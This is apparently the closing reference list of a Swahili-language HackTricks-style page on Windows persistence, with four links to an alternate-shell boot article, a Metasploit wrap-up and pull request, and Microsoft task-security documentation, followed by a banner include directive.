- [5] [Ninawezaje kuongeza chaguo la kuwasha linaloanzisha shell mbadala?](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [6] [Muhtasari wa Metasploit 04/03/2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)
- [7] [Metasploit PR #21032 – windows/persistence/userinit_mpr_logon_script](https://github.com/rapid7/metasploit-framework/pull/21032)
- [8] [Microsoft Learn – Muktadha wa usalama wa kazi](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks)
{{#include ../../banners/hacktricks-training.md}}
